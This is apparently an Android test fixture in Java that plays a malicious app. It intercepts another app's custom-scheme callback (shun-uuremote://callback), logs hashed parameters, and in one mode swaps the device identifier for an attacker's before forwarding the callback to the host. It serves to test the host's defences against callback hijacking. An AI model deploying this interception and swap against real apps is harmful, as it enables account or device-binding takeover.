package example.shun.fixture.fakeuu;

import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.widget.TextView;

/**
 * 扮演「抢回调的 App」（X06，UUR06）：也声明 shun-uuremote://callback，UU 给本 App 的回调可能被系统交到这里。
 * 只在 -PfakeUuHijack=true 的变体（fakeuu-hijack.apk）里启用。
 *
 * <p>模式（用 ModeActivity 设，和假 UU 的模式互不相干——这是另一个包）：
 * hijack_log（默认）：只记下拿到了什么；
 * hijack_swap：把加密设备标识换成自己的，用显式包名转给宿主。state 和 nonce 原样带着，宿主靠它们挡不住。
 *
 * <p>日志同样只写参数名和哈希，不写原文。
 */
public class HijackActivity extends Activity {
    static final String HOST_PACKAGE = "top.xdwa.shun";
    static final String ATTACKER_ID = "YXR0YWNrZXI+ZGV2aWNl";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        TextView text = new TextView(this);
        text.setPadding(48, 96, 48, 48);
        text.setTextSize(18);
        setContentView(text);

        Uri data = getIntent().getData();
        if (data == null) {
            finish();
            return;
        }
        String raw = data.toString();
        String mode = getSharedPreferences("fakeuu", MODE_PRIVATE).getString("mode", "hijack_log");
        Uri parsed = Uri.parse(raw);
        String state = parsed.getQueryParameter("state");
        Log.i(FakeUuActivity.TAG, "HIJACKED " + parsed.getPath()
                + " params=" + names(raw)
                + " stateLen=" + (state == null ? 0 : state.length())
                + " gotNonce=" + (parsed.getQueryParameter("nonce") != null)
                + " idHash=" + FakeUuActivity.hash(value(raw, "anonymous_device_id"))
                + " mode=" + mode);
        text.setText("抢回调的 App（测试用）拿到了一条 UU 回调\n模式 " + mode);

        if (mode.equals("hijack_swap")) {
            String swapped = swap(raw, "anonymous_device_id", ATTACKER_ID);
            Log.i(FakeUuActivity.TAG, "HIJACK forward to host, idHash=" + FakeUuActivity.hash(ATTACKER_ID));
            startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse(swapped))
                    .setPackage(HOST_PACKAGE)
                    .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
            finish();
        }
    }

    private static String names(String uri) {
        StringBuilder out = new StringBuilder("[");
        int q = uri.indexOf('?');
        if (q >= 0) {
            for (String part : uri.substring(q + 1).split("&")) {
                int eq = part.indexOf('=');
                if (out.length() > 1) out.append(", ");
                out.append(eq < 0 ? part : part.substring(0, eq));
            }
        }
        return out.append(']').toString();
    }

    private static String value(String uri, String key) {
        int q = uri.indexOf('?');
        if (q < 0) return null;
        for (String part : uri.substring(q + 1).split("&")) {
            int eq = part.indexOf('=');
            if (eq > 0 && part.substring(0, eq).equals(key)) return Uri.decode(part.substring(eq + 1));
        }
        return null;
    }

    /** 只换这一个参数的值，其余原文不动。 */
    private static String swap(String uri, String key, String value) {
        int q = uri.indexOf('?');
        if (q < 0) return uri;
        StringBuilder out = new StringBuilder(uri.substring(0, q + 1));
        String[] parts = uri.substring(q + 1).split("&");
        for (int i = 0; i < parts.length; i++) {
            int eq = parts[i].indexOf('=');
            boolean hit = eq > 0 && parts[i].substring(0, eq).equals(key);
            if (i > 0) out.append('&');
            out.append(hit ? key + "=" + Uri.encode(value) : parts[i]);
        }
        return out.toString();
    }
}
